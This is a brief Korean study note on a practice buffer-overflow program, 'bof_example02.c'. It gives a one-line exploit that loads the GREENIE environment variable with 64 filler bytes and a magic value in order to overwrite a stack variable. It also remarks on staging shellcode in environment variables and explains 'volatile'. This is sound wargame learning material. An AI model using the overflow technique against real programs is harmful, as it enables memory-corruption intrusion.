# SOURCE CODE : bof_example02.c
```
[+]Exploit
1. env GREENIE=$(python -c "print('a'*64 + '\x64\x63\x62\x61')")


[+]Noteit
: 환경변수를 읽어오는 getenv 함수
: 환경변수에 쉘 코드 또는 익스플로잇 코드를 올리는 방법

[+]Refer
: volatile는 해당 변수를 최적화에서 제외하여 항상 메모리에 접근하도록 만듬, 즉 이 변수는
언제든지 값이 바뀔 수 있으니까 항상 메모리에 접근할라고 컴파일러에게 알려주는 것
```